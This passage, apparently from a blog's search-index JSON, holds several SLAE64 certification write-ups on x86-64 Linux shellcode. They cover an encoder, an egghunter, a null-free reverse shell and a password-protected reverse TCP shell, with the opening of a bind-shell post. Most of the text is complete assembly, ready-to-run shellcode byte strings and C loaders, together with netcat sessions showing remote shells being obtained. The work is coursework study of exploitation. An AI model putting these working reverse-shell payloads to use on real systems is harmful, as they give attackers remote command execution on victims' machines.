0x96,0x1f,0x0e,0x96,0x1f,0xd8,0x96,0x1f,0x05,0x7e,0x96,0xa5,0x31,0x31,0x6c,0x77,0x70,0x31,0x5d,0x76,0x7d,0x96,0xd7,0xe9,0x7e,0x96,0xd7,0xec,0x79,0x96,0xd7,0xe8,0x9e,0x25,0x51,0x4b bytes_length equ $-bytesEndGamewhitecr0wz@SLAE64:~/assembly/assignments/Assignment_4$ gcc rot-mmx_xor.c -o rot-mmx_xor -fno-stack-protector -z execstack -w whitecr0wz@SLAE64:~/assembly/assignments/Assignment_4$ ./rot-mmx_xor Shellcode Length: 32$Extra bitsFor the sake of curiosity, I chose to submit this file within VirusTotal.com and find out the rate of detection. Interestly enough, this caught me off guard!Hash: b474e66209c6f09c59b5e33780a1a94c2dce9b82857cff2b0c65eb233bc0508cCodeThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/Student ID: SLAE64-27812/PA-27812You can find all of the used resources within this post here." }, { "title": "SLAE64 - Assignment 3 - Egghunter", "url": "/posts/SLAE64-Egghunter/", "categories": "SLAE64", "tags": "assembly, shellcoding", "date": "2021-01-24 05:44:00 +0000", "snippet": "IntroductionThese series of posts starting with the prefix “SLAE64 - Assignment” will be created in order to fulfill the requirements of the SLAE64 certification. Today we are going to have a close look at Egghunters.An Egghunter is a form of malware, commonly used during Exploit-Development sessions in order to process bigger shellcode when there is low space available. The process is quite simple, this will search for a specific tag within the memory. When found, the flow will be passed upon the instructions following the tag, executing the original shellcode.The third assignment from the seven requires the creation of an Egghunter through the Assembly language, and converting such into shellcode. Moreover, it is required to test such.MethodsIn order to create an Egghunter shellcode, there are several paths. However, as the time goes on, newer techniques are implemented that make shellcoding easier. I have chosen to cover a modern method which is fast, and tends to be very small regarding size. This method obeys the following procedure: RCX is chosen as the register to compare with the tag. The tag is saved on RBP. This tag will not be hardcoded. RCX is incremented. RBP is compared against RCX. If the Zero flag (ZF) hasn’t been set, repeat this loop. Give RCX the value of RCX+8, in order to jump exactly within the shellcode and not the tag. Jump to RCX.Code:global _start_start: inc rdx ; Increments RDX. push rdx ; Pushes the value of RDX into the Stack. pop rcx ; Pops the top of the Stack into RCX. mov rbp, 0x5756575657565756 ; Original tag should be 0x4645464546454645. mov rbx, 0x1111111111111111 ; Gives the value \"0x1111111111111111\" to RBX. sub rbp, rbx ; RBP is substracted by RBX.main: inc rcx ; RCX is incremented. cmp rbp, [rcx] ; RBP is compared against RCX. jnz main ; Jump to main if the Zero flag (ZF) hasn't been set. lea rcx, [rcx + 8] ; Copy RCX+8 into RCX. jmp rcx ; Jump into RCX.Let’s assemble this, link it, and get its shellcode.whitecr0wz@SLAE64:~/assembly/assignments/Assignment_3$ nasm -f elf64 1.asm -o 1.o &amp;&amp; ld 1.o -o 1 &amp;&amp; for i in $(objdump -d 1 -M intel |grep \"^ \" |cut -f2); do echo -n '\\x'$i; done;echo \\x48\\xff\\xc2\\x52\\x59\\x48\\xbd\\x56\\x57\\x56\\x57\\x56\\x57\\x56\\x57\\x48\\xbb\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x48\\x29\\xdd\\x48\\xff\\xc1\\x48\\x3b\\x29\\x75\\xf8\\x48\\x8d\\x49\\x08\\xff\\xe1whitecr0wz@SLAE64:~/assembly/assignments/Assignment_3$C format#include&lt;stdio.h&gt;#include&lt;string.h&gt;unsigned char egg[] = \\\"\\x48\\xff\\xc2\\x52\\x59\\x48\\xbd\\x56\\x57\\x56\\x57\\x56\\x57\\x56\\x57\\x48\\xbb\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x48\\x29\\xdd\\x48\\xff\\xc1\\x48\\x3b\\x29\\x75\\xf8\\x48\\x8d\\x49\\x08\\xff\\xe1\";unsigned char code[] = \\\"\\x45\\x46\\x45\\x46\\x45\\x46\\x45\\x46\"\"\\x48\\x31\\xc0\\x48\\x31\\xf6\\x48\\x31\\xdb\\x50\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\x50\\x48\\x89\\xe2\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05\";main(){ printf(\"Shellcode size: %d\\n\", strlen(code)); printf(\"Egg size: %d\\n\", strlen(egg)); int (*ret)() = (int(*)())egg; ret();}EndGamewhitecr0wz@SLAE64:~/assembly/assignments/Assignment_3$ gcc egghunter-x86_64.c -o egghunter-x86_64 -fno-stack-protector -z execstack -w whitecr0wz@SLAE64:~/assembly/assignments/Assignment_3$ ./egghunter-x86_64 Shellcode size: 44Egg size: 42$As exactly as in the x86 version of this post, it was required that the egghunter had to be configurable for distinct payload. Due to the reason that the only thing required is the tag, this is rather easy, let’s test it with an execve shellcode that executes neofetch.C format #2#include&lt;stdio.h&gt;#include&lt;string.h&gt;unsigned char egg[] = \\\"\\x48\\xff\\xc2\\x52\\x59\\x48\\xbd\\x56\\x57\\x56\\x57\\x56\\x57\\x56\\x57\\x48\\xbb\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x48\\x29\\xdd\\x48\\xff\\xc1\\x48\\x3b\\x29\\x75\\xf8\\x48\\x8d\\x49\\x08\\xff\\xe1\";unsigned char code[] = \\\"\\x45\\x46\\x45\\x46\\x45\\x46\\x45\\x46\"\"\\x48\\x31\\xc0\\x50\\x48\\xbb\\x6e\\x65\\x6f\\x66\\x65\\x74\\x63\\x68\\x53\\x48\\xbb\\x75\\x73\\x72\\x2f\\x62\\x69\\x6e\\x2f\\x53\\x48\\xbb\\x2f\\x2f\\x2f\\x2f\\x2f\\x2f\\x2f\\x2f\\x53\\x48\\x89\\xe7\\x50\\x48\\x89\\xe2\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05\";main(){ printf(\"Shellcode size: %d\\n\", strlen(code)); printf(\"Egg size: %d\\n\", strlen(egg)); int (*ret)() = (int(*)())egg; ret();}EndGame #2whitecr0wz@SLAE64:~/assembly/assignments/Assignment_3/2$ gcc neofetch.c -o neofetch -fno-stack-protector -z execstack -w whitecr0wz@SLAE64:~/assembly/assignments/Assignment_3/2$ ./neofetch Shellcode size: 60Egg size: 42 _,met$$$$$gg. whitecr0wz@SLAE64 ,g$$$$$$$$$$$$$$$P. ----------------- ,g$$P\" \"\"\"Y$$.\". OS: Debian GNU/Linux 10 (buster) x86_64 ,$$P' `$$$. Host: VirtualBox 1.2',$$P ,ggs. `$$b: Kernel: 4.19.0-13-amd64`d$$' ,$P\"' . $$$ Uptime: 8 mins $$P d$' , $$P Packages: 475 (dpkg) $$: $$. - ,d$$' Shell: bash 5.0.3 $$; Y$b._ _,d$P' CPU: Intel i5-8300H (1) @ 2.304GHz Y$$. `.`\"Y$$$$P\"' GPU: VMware SVGA II Adapter `$$b \"-.__ Memory: 66MiB / 987MiB `Y$$ `Y$$. `$$b. `Y$$b. `\"Y$b._ `\"\"\"whitecr0wz@SLAE64:~/assembly/assignments/Assignment_3/2$CodeThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/Student ID: SLAE64-27812/PA-27812You can find all of the used resources within this post here." }, { "title": "SLAE64 - Assignment 2B - Null-Free Bind Reverse Shellcode", "url": "/posts/SLAE64-Null-Free-Reverse/", "categories": "SLAE64", "tags": "assembly, shellcoding", "date": "2021-01-23 05:44:00 +0000", "snippet": "These series of posts starting with the prefix “SLAE64 - Assignment” will be created in order to fulfill the requirements of the SLAE64 certification.A Reverse shell is a form of malware which grants remote access to a system through a shell. However, it differentiates from its peer the Bind Shell, arranging a specific connection on a trivial address, instead of binding the compromised device into a certain port. Furthermore, after the connection is established, a shell is executed, granting interaction to the attacker.The first assignment from the seven is divided in two sections: A: Requires the creation of a Reverse Shell with password protection through the Assembly language, and converting such into shellcode. B: Requires the alteration of the provided Reverse Shell during the course, in order that it no longer possesses any form of NULL bytes (00).Due to the reason that in the previous post the first section of the exercise was tackled, this post will be focused towards the secondary task.Let’s analyze the Reverse Shell given during the course:hitecr0wz@SLAE64:~/assembly/assignments/Assignment_2/B/og$ objdump -D 1.o -M intel 1.o: file format elf64-x86-64Disassembly of section .text:0000000000000000 &lt;_start&gt;: 0: b8 29 00 00 00 mov eax,0x29 5: bf 02 00 00 00 mov edi,0x2 a: be 01 00 00 00 mov esi,0x1 f: ba 00 00 00 00 mov edx,0x0 14: 0f 05 syscall 16: 48 89 c7 mov rdi,rax 19: 48 31 c0 xor rax,rax 1c: 50 push rax 1d: c7 44 24 fc 7f 00 00 mov DWORD PTR [rsp-0x4],0x100007f 24: 01 25: 66 c7 44 24 fa 11 5c mov WORD PTR [rsp-0x6],0x5c11 2c: 66 c7 44 24 f8 02 00 mov WORD PTR [rsp-0x8],0x2 33: 48 83 ec 08 sub rsp,0x8 37: b8 2a 00 00 00 mov eax,0x2a 3c: 48 89 e6 mov rsi,rsp 3f: ba 10 00 00 00 mov edx,0x10 44: 0f 05 syscall 46: b8 21 00 00 00 mov eax,0x21 4b: be 00 00 00 00 mov esi,0x0 50: 0f 05 syscall 52: b8 21 00 00 00 mov eax,0x21 57: be 01 00 00 00 mov esi,0x1 5c: 0f 05 syscall 5e: b8 21 00 00 00 mov eax,0x21 63: be 02 00 00 00 mov esi,0x2 68: 0f 05 syscall 6a: 48 31 c0 xor rax,rax 6d: 50 push rax 6e: 48 bb 2f 62 69 6e 2f movabs rbx,0x68732f2f6e69622f 75: 2f 73 68 78: 53 push rbx 79: 48 89 e7 mov rdi,rsp 7c: 50 push rax 7d: 48 89 e2 mov rdx,rsp 80: 57 push rdi 81: 48 89 e6 mov rsi,rsp 84: 48 83 c0 3b add rax,0x3b 88: 0f 05 syscall whitecr0wz@SLAE64:~/assembly/assignments/Assignment_2/B/og$Similarly like in the prior Assignment, most of the NULL opcodes arise from MOV operations, moving small values into rather big registers (I.E performing a MOV operation against the value “1” into RSI). In order to prevent such values, Lower bit Registers can be used. For instance, instead of using RAX when incrementing the register, AL could be used instead, which performs the same operation, with no NULLs whatsoever. In addition, a similar operation could be incrementing the register by one.Final code:global _start_start:\t; sock = socket(AF_INET, SOCK_STREAM, 0)\t; AF_INET = 2\t; SOCK_STREAM = 1\t; syscall number 41 xor rax, rax xor rdi, rdi xor rsi, rsi xor rdx, rdx\tmov al, 41 inc rdi inc rdi inc rsi\tsyscall\t; copy socket descriptor to rdi for future use\tmov rdi, rax\t; server.sin_family = AF_INET\t; server.sin_port = htons(PORT)\t; server.sin_addr.s_addr = inet_addr(\"127.0.0.1\")\t; bzero(&amp;server.sin_zero, 8)\txor rdx, rdx xor rbp, rbp push word 0x2 pop bp\tpush rdx\tmov dword [rsp-4], 0x0101017f\tmov word [rsp-6], 0x5c11\tmov word [rsp-8], bp\tsub rsp, 8\t; connect(sock, (struct sockaddr *)&amp;server, sockaddr_len)\tmov al, 42\tmov rsi, rsp\tmov dl, 16\tsyscall ; duplicate sockets ; dup2 (new, old)\tmov al, 33 xor rsi, rsi syscall mov al, 33 inc rsi syscall mov al, 33 inc rsi syscall ; execve ; First NULL push xor rax, rax push rax ; push /bin//sh in reverse mov rbx, 0x68732f2f6e69622f push rbx ; store /bin//sh address in RDI mov rdi, rsp ; Second NULL push push rax ; set RDX mov rdx, rsp ; Push address of /bin//sh push rdi ; set RSI mov rsi, rsp ; Call the Execve syscall add rax, 59 syscallLet’s assemble, link this and get its shellcode!whitecr0wz@SLAE64:~/assembly/assignments/Assignment_2/B$ nasm -f elf64 1.asm -o 1.o &amp;&amp; ld 1.o -o 1 &amp;&amp; for i in $(objdump -d 1 -M intel |grep \"^ \" |cut -f2); do echo -n '\\x'$i; done;echoC format#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned char code[] = \\\"\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2\\xb0\\x29\\x48\\xff\\xc7\\x48\\xff\\xc7\\x48\\xff\\xc6\\x0f\\x05\\x48\\x89\\xc7\\x48\\x31\\xd2\\x48\\x31\\xed\\x66\\x6a\\x02\\x66\\x5d\\x52\\xc7\\x44\\x24\\xfc\\x7f\\x01\\x01\\x01\\x66\\xc7\\x44\\x24\\xfa\\x11\\x5c\\x66\\x89\\x6c\\x24\\xf8\\x48\\x83\\xec\\x08\\xb0\\x2a\\x48\\x89\\xe6\\xb2\\x10\\x0f\\x05\\xb0\\x21\\x48\\x31\\xf6\\x0f\\x05\\xb0\\x21\\x48\\xff\\xc6\\x0f\\x05\\xb0\\x21\\x48\\xff\\xc6\\x0f\\x05\\x48\\x31\\xc0\\x50\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\x50\\x48\\x89\\xe2\\x57\\x48\\x89\\xe6\\x48\\x83\\xc0\\x3b\\x0f\\x05\";main(){ printf(\"Shellcode Length: %d\\n\", (int)strlen(code)); int (*ret)() = (int(*)())code; ret(); }EndGamewhitecr0wz@SLAE64:~/assembly/assignments/Assignment_2/B$ gcc reverse-null-free.c -o reverse-null-free -fno-stack-protector -z execstack -w whitecr0wz@SLAE64:~/assembly/assignments/Assignment_2/B$ ./reverse-null-free Shellcode Length: 126─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────whitecr0wz@SLAE64:~$ nc -lvp 4444 listening on [any] 4444 ...connect to [127.1.1.1] from localhost [127.0.0.1] 40484iduid=1000(whitecr0wz) gid=1000(whitecr0wz) groups=1000(whitecr0wz),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)pwd/home/whitecr0wz/assembly/assignments/Assignment_2/Bpython3 -c 'import pty;pty.spawn(\"/bin/bash\")';whitecr0wz@SLAE64:/home/whitecr0wz/assembly/assignments/Assignment_2/B$ id id uid=1000(whitecr0wz) gid=1000(whitecr0wz) groups=1000(whitecr0wz),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)whitecr0wz@SLAE64:/home/whitecr0wz/assembly/assignments/Assignment_2/B$CodeThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/Student ID: SLAE64–27812/PA-27812You can find all of the used resources within this post here." }, { "title": "SLAE64 - Assignment 2A - Password-Protected Reverse TCP Shellcode", "url": "/posts/SLAE64-Reverse-Password/", "categories": "SLAE64", "tags": "assembly, shellcoding", "date": "2021-01-22 05:44:00 +0000", "snippet": "IntroductionThese series of posts starting with the prefix “SLAE64 - Assignment” will be created in order to fulfill the requirements of the SLAE64 certification. Today we are going to have a close look at Linux Reverse Shells with password protection.A Reverse shell is a form of malware which grants remote access to a system through a shell. However, it differentiates from its peer the Bind Shell, arranging a specific connection on a trivial address, instead of binding the compromised device into a certain port. Furthermore, after the connection is established, a shell is executed, granting interaction to the attacker.The first assignment from the seven is divided in two sections: A: Requires the creation of a Reverse Shell with password protection through the Assembly language, and converting such into shellcode. B: Requires the alteration of the provided Reverse Shell during the course, in order that it no longer possesses any form of NULL bytes (00).As exercise A is already quite a complex and long exercise, the first assignment will be segmented in two different posts, thing which may repeat within the second assignment. During the length of this post, you will observe the solution for exercise A.TheoryIf you remember the x86 version of this assignment, you’d remember that the required functions for a Bind Shell are the following: Socket Connect Dup2 Execve After the dup2 syscall has been satisfied and executed, the connection should already possess the ability to interact with the other gadget. Therefore, we could send a message and receive information from the other device. The process will be the following: Socket Connect Dup2 Function that is only executed if the comparison ends up not matching. (write failure message) Function that asks for the passcode (write). After the dup2 syscall is initialized, a JMP will be set so that the flow directly continues to this function. Function that reads the input (read). Function that compares the input with the intended passcode. If they do not match, jump to the failure function. Execve Execve Time to stick our hands into the mudLet’s crack this shellcode down and explain it section by section, shall we?First things first, we have to clean all registers, otherwise the shellcode would fail within a real program flow with distinct values.global _start_start:xoring: xor rax, rax ; Zeroes out RAX. xor rbx, rbx ; Zeroes out RBX. xor rdi, rdi ; Zeroes out RDI. xor rsi, rsi ; Zeroes out RSI. xor rdx, rdx ; Zeroes out RDX. xor rbp, rbp ; Zeroes out RBP.Let’s initialize the socket. The procedure should follow this path:manpage arguments: int socket(int domain, int type, int protocol); RAX obtains the syscall value. RDI is incremented until the value AF_INET is given. RSI is incremented once, in order to obtain the value SOCK_STREAM. RDX is pushed, as its value is required to be 0. The syscall is executed. The RAX value is copied into RBX for sockfd arguments later on.socket: push word 41 ; Pushes word 41 (socket) into the stack. pop ax ; Pops such word into ax so there are no nulls. inc rdi ; Increments RDI. inc rdi ; Increments RDI. Gives the value of AF_INET. inc rsi ; Increments RSI. Gives value of SOCK_STREAM. push rdx ; As the protocol isn't important, the value of 0 in RDX is pushed. syscall ; The syscall is executed. mov rbx, rax ; The value of RAX is saved on RBX. Such value will later on be used for sockfd arguments.Connectmanpage arguments: int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen); RBP stores value “192.168.100.207” in reverse and hex as well. RAX obtains the syscall value. RDI satisfies the sockfd argument, by copying the value in RBX. 0 is pushed through RDX. The value in RBP is pushed. “9000” is pushed within the hex format. “AF_INET” is pushed within the hex format. The value of RSP is copied into RSI. DL is given a length of 50. The syscall is executed. RSI is zeroed out. RSI is given a value of 3, as the following function is dup2connect: mov rbp, 0xcf64a8c0 ; Saves \"192.168.100.207\" in hex and reverse order, storing it in RBP push word 42 ; Pushes word 41 (connect) into the stack. pop ax ; Pops such word into ax so there are no nulls. mov rdi, rbx ; Copies the value from RBX to RDI, granting RDI the sockfd value from the socket syscall. push rdx ; Pushes 0 push rbp ; Pushes the value of RBP into the Stack. push word 0x2823 ; Pushes the word 9000 into the stack. push word 0x02 ; Pushes AF_INET into the stack. mov rsi, rsp ; Copies the value of RSP into RSI. mov dl, 50 ; This argument requires the length of the struct, anything above 16 should work. syscall ; The syscall is executed. xor rsi, rsi ; Zeroes out RSI inc rsi ; Increments RSI. inc rsi ; Increments RSI. inc rsi ; Increments RSI. This will work as a counter, for the dup2 syscall, by incrementing RSI by three times NULLs are prvented.Dup2manpage arguments: int dup2(int oldfd, int newfd); RAX obtains the syscall value. The value of RBX is copied into RDI, satisfying the oldfd argument. RSI is decremented, satisfying the newfd argument. The syscall is executed. As long as the Zero flag hasn’t been set, repeat the loop. Jump to the function “question”.dup2: push word 33 ; Pushes word 33 (dup2) into the stack. pop ax ; Pops such word into ax so there are no nulls. mov rdi, rbx ; Copies the value from RBP to RDX, granting RDI the sockfd value from the socket syscall. dec rsi ; RSI is decremented. syscall ; The syscall is executed. jnz dup2 ; Jump to dup2 if the Zero flag (ZF) hasn't been set. jmp question ; Jump to the \"question\" function.Haltmanpage arguments: ssize_t write(int fd, const void *buf, size_t count); It is required to call the write syscall. This will be arranged by incrementing the value of AL by 1. RDI will be incremented as well, as this will give RDI the STDOUT value, printing to the screen. RSI will hold temporarely and push the value to print to the screen. RSI will then copy the value from RSP. DL will be given the length of the entire string. This should write “Failure. “ into the client’s screen.halt: xor rax, rax ; Zeroes out RAX. xor rdi, rdi ; Zeroes out RDI. xor rsi, rsi ; Zeroes out RSI. xor rdx, rdx ; Zeroes out RDX. push rdi ; Pushes the NULL DWORD (0x00000000) of RDI into the stack. pop rbp ; Pops the NULL DWORD in RBP. push rbp ; Pushes the NULL DWORD (0x00000000) of RBP into the stack. Without this combination of PUSH/POP instructions the printed characters would have an ; additional character that isn't needed (I.E an - or &lt;) inc al ; Increments AL, giving the value 1 for the syscall write. inc rdi ; Increments RDI, giving the value of 1, arranging STDOUT, printing the message on the screen. add rsi, ' ' ; Blank space. push rsi ; Pushes the value of RSI into the stack. mov rsi, 'Failure.' ; Inserts value 'Failure.' into RSI push rsi ; Pushes the value of RSI into the stack. mov rsi, rsp ; Copies the value of RSP into RSI. The complete phrase should be \"Failure. \" mov dl, 9 ; Gives DL the length of the entire string, which should be around 9. If DL is given a bigger value than the real one (I.E 50), the password will ; be printed when this message pops up. syscall ; The syscall is executed.Questionmanpage arguments: ssize_t write(int fd, const void *buf, size_t count); It is required to call the write syscall. This will be arranged by incrementing the value of AL by 1. RDI will be incremented as well, as this will give RDI the STDOUT value, printing to the screen. RSI will hold temporarely and push the value to print to the screen. RSI will then copy the value from RSP. DL will be given the length of the entire string. This should write “Credentials:” into the client’s screen.question: xor rax, rax ; Zeroes out RAX. xor rdi, rdi ; Zeroes out RDI. xor rsi, rsi ; Zeroes out RSI. xor rdx, rdx ; Zeroes out RDX. push rdi ; Pushes the NULL DWORD (0x00000000) of RDI into the stack. pop rbp ; Pops the NULL DWORD in RBP. push rbp ; Pushes the NULL DWORD (0x00000000) of RBP into the stack. Without this combination of PUSH/POP instructions the printed characters would have an ; additional character that isn't needed (I.E an - or &lt;) inc al ; Increments AL, giving the value 1 for the syscall write. inc rdi ; Increments RDI, giving the value of 1, arranging STDOUT, printing the message on the screen. mov rsi, 'entials:' ; Inserts value 'entials:' into RSI push rsi ; Pushes the value of RSI into the stack. mov rsi, 'Cred' ; Inserts value 'Cred' into RSI push rsi ; Pushes the value of RSI into the stack. mov rsi, rsp ; Copies the value of RSP into RSI. The complete phrase should be \"Credentials:\" mov dl, 16 ; Gives DL the length of the entire string, which should be around 16. If DL is given a bigger value than the real one (I.E 50), the string will be ; printed several times and lack certain characters. syscall ; The syscall is executed.Readmanpage arguments: ssize_t read(int fd, void *buf, size_t count); The value of RAX is set to 0, as it is the value for the read syscall. The value of RDI is quite irrelevant, therefore, it is zeroed as well. RSI is inserted the value of RSP. DL is given the quantity of bytes to read. Nonetheless, as long as the quantity is as big as the input, anything goes! xor rax, rax ; Zeroes out RAX. xor rdi, rdi ; Zeroes out RDI. xor rdx, rdx ; Zeroes out RDX. push rdx ; Pushes the NULL DWORD (0x00000000) of RDX into the stack. pop rbp ; Pops the NULL DWORD in RBP. push rbp ; Pushes the NULL DWORD (0x00000000) of RBP into the stack. Without this combination of PUSH/POP instructions the printed characters would have an ; additional character that isn't needed (I.E an - or &lt;). mov rsi, rsp ; Copies the value of RSP into RSI. mov dl, 30 ; Gives DL the quantity of bytes to read, anything beyond intended should work as well. syscall ; The syscall is executed.Comparison RDI is given the value of RSP. In other words, RDI should hold the value of the input. RSI is used in order to save the password to compare with. RCX will be used as a counter. The instructions repe cmpsb, in simple terms, will compare every byte of RDI with RSI, as long as these match, the Zero flag (ZF) will be set. Furthermore, if all 16 bytes are the same, the ZF will remain deployed. If the ZF hasn’t been deployed, jump to the halt function.comparison: ; Password K6zjZpUKamLDSH8d mov rdi, rsp ; Copies the value of RSP into RSI. This will copy what was read on the previous function. xor rax, rax ; Zeroes out RAX. xor rsi, rsi ; Zeroes out RSI. xor rdx, rdx ; Zeroes out RDX. mov rsi, 'amLDSH8d' ; Inserts value 'amLDSH8d' into RSI. push rsi ; Pushes the value of RSI into the stack. mov rsi, 'K6zjZpUK' ; Inserts value 'K6zjZpUK' into RSI. push rsi ; Pushes the value of RSI into the stack. mov rsi, rsp ; Copies the value of RSP into RSI. xor rcx, rcx ; Zeroes out RCX. mov cl, 16 ; Gives CL a value of 16. This value should remain the same length as the password (K6zjZpUKamLDSH8d), as this value will be crucial for ; comparison. ; If given less, the complete password isn't needed. If given more, the credential will not work even if sent correctly. repe cmpsb ; Will compare the strings and check if such match. If they do, it mantains the Zero flag (ZF). jnz halt ; Jump if the as long as the Zero flag (ZF) is not set, this means that if the password is incorrect, it should redirect the flow to the error ; message.Execvemanpage arguments: int execve(const char *pathname, char *const argv[], char *const envp[]); RAX will be zeroed out and used mainly for pushing its NULL DWORD. Furthermore, the syscall value for execve will be given at the ending. RBX has to hold the //bin/sh value for itself to be pushed into the stack. RDI may copy the value from the stack. RDX must be set to zero, through the RAX DWORD. RDI shall be pushed and RSI will copy the value from the stack. The syscall is executed.execve: xor rax, rax ; Zeroes out RAX. push rax ; Pushes the NULL DWORD of RAX. mov rbx, '//bin/sh' ; Gives RBX the value '//bin/sh' push rbx ; Pushes the value of RBX into the Stack. mov rdi, rsp ; Copies the value of RSP into RDI. push rax ; Pushes the NULL DWORD of RAX. mov rdx, rsp ; Copies the value of RSP into RDX, giving a value of 0. push rdi ; Pushes the value of RDI into the Stack. mov rsi, rsp ; Copies the value of RSP into RSI. push word 59 ; Pushes word 59 (execve) into the stack. pop ax ; Pops such word into ax so there are no nulls. syscall ; The syscall is executed.Final CodeThe full code can be found hereLet’s assemble, link this and get its shellcode!whitecr0wz@SLAE64:~/assembly/assignments/Assignment_2$ nasm -f elf64 1.asm -o 1.o &amp;&amp; ld 1.o -o 1 &amp;&amp; for i in $(objdump -d 1 -M intel |grep \"^ \" |cut -f2); do echo -n '\\x'$i; done;echoC format#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned char code[] = \\\"\\x48\\x31\\xc0\\x48\\x31\\xdb\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2\\x48\\x31\\xed\\x66\\x6a\\x29\\x66\\x58\\x48\\xff\\xc7\\x48\\xff\\xc7\\x48\\xff\\xc6\\x52\\x0f\\x05\\x48\\x89\\xc3\\xbd\\xc0\\xa8\\x64\\xcf\\x66\\x6a\\x2a\\x66\\x58\\x48\\x89\\xdf\\x52\\x55\\x66\\x68\\x23\\x28\\x66\\x6a\\x02\\x48\\x89\\xe6\\xb2\\x32\\x0f\\x05\\x48\\x31\\xf6\\x48\\xff\\xc6\\x48\\xff\\xc6\\x48\\xff\\xc6\\x66\\x6a\\x21\\x66\\x58\\x48\\x89\\xdf\\x48\\xff\\xce\\x0f\\x05\\x75\\xf1\\xeb\\x2b\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2\\x57\\x5d\\x55\\xfe\\xc0\\x48\\xff\\xc7\\x48\\x83\\xc6\\x20\\x56\\x48\\xbe\\x46\\x61\\x69\\x6c\\x75\\x72\\x65\\x2e\\x56\\x48\\x89\\xe6\\xb2\\x09\\x0f\\x05\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2\\x57\\x5d\\x55\\xfe\\xc0\\x48\\xff\\xc7\\x48\\xbe\\x65\\x6e\\x74\\x69\\x61\\x6c\\x73\\x3a\\x56\\xbe\\x43\\x72\\x65\\x64\\x56\\x48\\x89\\xe6\\xb2\\x10\\x0f\\x05\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xd2\\x52\\x5d\\x55\\x48\\x89\\xe6\\xb2\\x1e\\x0f\\x05\\x48\\x89\\xe7\\x48\\x31\\xc0\\x48\\x31\\xf6\\x48\\x31\\xd2\\x48\\xbe\\x61\\x6d\\x4c\\x44\\x53\\x48\\x38\\x64\\x56\\x48\\xbe\\x4b\\x36\\x7a\\x6a\\x5a\\x70\\x55\\x4b\\x56\\x48\\x89\\xe6\\x48\\x31\\xc9\\xb1\\x10\\xf3\\xa6\\x0f\\x85\\x64\\xff\\xff\\xff\\x48\\x31\\xc0\\x50\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\x50\\x48\\x89\\xe2\\x57\\x48\\x89\\xe6\\x66\\x6a\\x3b\\x66\\x58\\x0f\\x05\";main(){ printf(\"Shellcode Length: %d\\n\", (int)strlen(code)); int (*ret)() = (int(*)())code; ret(); }EndGamewhitecr0wz@SLAE64:~/assembly/assignments/Assignment_2$ gcc reverse-password.c -o reverse-password -fno-stack-protector -z execstack -w whitecr0wz@SLAE64:~/assembly/assignments/Assignment_2$ ./reverse-password Shellcode Length: 285─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────root@whitecr0wz:~# nc -lvp 9000 listening on [any] 9000 ...192.168.100.205: inverse host lookup failed: Unknown hostconnect to [192.168.100.207] from (UNKNOWN) [192.168.100.205] 40094Credentials:passwordFailure. Credentials:cmonFailure. Credentials:K6zjZpUKamLDSH8dpython3 -c 'import pty;pty.spawn(\"/bin/bash\")';whitecr0wz@SLAE64:/home/whitecr0wz/assembly/assignments/Assignment_2$ id id uid=1000(whitecr0wz) gid=1000(whitecr0wz) groups=1000(whitecr0wz),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)whitecr0wz@SLAE64:/home/whitecr0wz/assembly/assignments/Assignment_2$CodeThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/Student ID: SLAE64–27812/PA-27812You can find all of the used resources within this post here." }, { "title": "SLAE64 - Assignment 1B - Null-Free Bind TCP Shellcode", "url": "/posts/SLAE64-Null-Free-Bind/", "categories": "SLAE64", "tags": "assembly, shellcoding", "date": "2021-01-21 05:44:00 +0000", "snippet": "IntroductionThese series of posts starting with the prefix “SLAE64 - Assignment” will be created in order to fulfill the requirements of the SLAE64 certification.A Bind shell is a form of malware which grants remote access to a system through a shell. However, it differentiates from its peer the Reverse Shell, binding to a local port of the compromised system, instead of arranging a specific connection on a trivial address. Furthermore, after the connection is established, a shell is executed, granting interaction to the attacker.The first assignment from the seven is divided in two sections: A: Requires the creation of a Bind Shell with password protection through the Assembly language, and converting such into shellcode. B: Requires the alteration of the provided Bind Shell during the course, in order that it no longer possesses any form of NULL bytes (00).Due to the reason that in the previous post the first section of the exercise was tackled, this post will be focused towards the secondary task.Let’s analyze the Bind Shell given during the course:whitecr0wz@SLAE64:~/assembly/assignments/Assignment_1/B/og$ objdump -D 1.o -M intel1.o: file format elf64-x86-64 Disassembly of section .text:0000000000000000 &lt;_start&gt;: 0: b8 29 00 00 00 mov eax,0x29 5: bf 02 00 00 00 mov edi,0x2 a: be 01 00 00 00 mov esi,0x1 